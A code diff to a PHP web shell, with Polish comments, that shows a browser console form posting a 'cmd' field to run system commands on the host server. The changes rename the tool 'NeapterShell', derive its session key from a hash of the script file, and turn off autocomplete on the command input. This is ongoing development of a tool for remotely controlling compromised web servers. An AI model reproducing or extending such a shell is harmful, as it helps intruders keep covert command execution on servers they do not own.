@@ -351,12 +351,12 @@ logout - Wylogowanie';
 		/**
 		 * Unikalny klucz
 		 */
-		$this -> sKey = sha1( $sScriptFilename = Request::getServer( 'SCRIPT_FILENAME' ), TRUE ) . md5( filectime( $sScriptFilename ), TRUE ) . md5( $sScriptFilename, TRUE );
+		$this -> sKey = sha1( $sScriptFilename = Request::getServer( 'SCRIPT_FILENAME' ), TRUE ) . md5( md5_file( $sScriptFilename ), TRUE ) . md5( $sScriptFilename, TRUE );
 
 		/**
 		 * Prefix
 		 */
-		$this -> sPrefix = substr( base64_encode( md5( $sScriptFilename + md5( filectime( $sScriptFilename ) ), TRUE ) ), 0, 8 ) . '_';
+		$this -> sPrefix = substr( base64_encode( md5( $sScriptFilename, TRUE ) . md5_file( $sScriptFilename, TRUE ) ), 0, 8 ) . '_';
 
 		/**
 		 * Mozliwosc wywolania polecenia systemowego
@@ -885,6 +885,9 @@ system - Uruchomienie polecenia systemowego
 DATA;
 		}
 
+		/**
+		 * Jezeli safemode jest wylaczony
+		 */
 		if( ! $this -> bSafeMode )
 		{
 			if( strncmp( $sCmd, 'cd ', 3 ) === 0 )
@@ -1390,7 +1393,7 @@ DATA;
 		{
 			$sContent  = sprintf( '<pre id="console">%s</pre><br/>' .
 				'<form action="%s" method="post">' .
-				'<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
+				'<input type="text" name="cmd" value="%s" size="110" id="cmd" autocomplete="off"/>' .
 				'<input type="submit" name="submit" value="Execute" id="cmd-send"/></form>',
 				$sConsole,
 				Request::getCurrentUrl(),
@@ -1440,7 +1443,7 @@ DATA;
 
 		$sMenu = $this -> getMenu();
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
-		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
+		$sTitle = sprintf( 'NeapterShell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
 return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body>
 <div id=\"body\">" .
